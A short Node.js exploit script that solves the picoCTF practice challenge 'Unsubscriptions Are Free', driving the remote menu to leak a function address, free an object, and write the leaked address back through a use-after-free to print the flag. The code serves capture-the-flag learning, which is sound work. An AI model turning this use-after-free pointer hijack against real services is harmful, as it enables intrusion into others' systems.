/**
 * https://play.picoctf.org/practice/challenge/187 (Unsubscriptions Are Free)
 */

const { Remote, convo } = require("..");

(async () => {
    const remote = Remote.create("mercury.picoctf.net", 61817);


    const selectMenu = async (c) => remote.onceDataAsync('(e)xit\n').then(() => remote.send(c + "\n"));

    await selectMenu("S")
    await remote.onceDataAsync('0x');
    const [hexStr] = await remote.onceLinesAsync(1);
    const vulnAddr = parseInt(hexStr, 16);

    await selectMenu("M");
    await remote.send("\n");

    await selectMenu("I");
    await remote.send("Y\n");

    await selectMenu("L");
    await remote.send(convo.toString(vulnAddr) + "\n");

    await remote.onceDataAsync('try anyways:\n')

    console.log((await remote.onceLinesAsync(1))[0]);
    process.exit(1)
})();
